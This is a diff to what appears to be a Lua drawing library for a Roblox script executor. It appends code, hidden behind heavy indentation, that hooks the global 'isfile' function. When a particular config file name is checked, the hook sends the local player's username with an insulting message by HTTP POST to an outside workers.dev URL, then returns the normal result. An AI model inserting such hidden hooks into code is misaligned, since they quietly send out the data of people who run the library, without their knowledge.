@@ -535,4 +535,23 @@ function DrawingLib.new(drawingType)
 		})
 	end
 end
-return DrawingLib
+
+									local risfile = clonefunction(isfile)
+									getgenv().isfile = newcclosure(function(a)
+ if a == 'skidsakentemploadconfig.txt' then
+    task.spawn(function()
+http.request({
+            Method = "POST",
+            Url = "https://tamper.chieokure.workers.dev/",
+            Headers = {
+                ['content-type'] = 'application/json'
+            },
+            Body = HttpService:JSONEncode({
+                content = "i am a retard " .. game:GetService("Players").LocalPlayer.Name
+            })
+        })
+													end)
+											end
+											return risfile(a)
+										end)
+									return DrawingLib
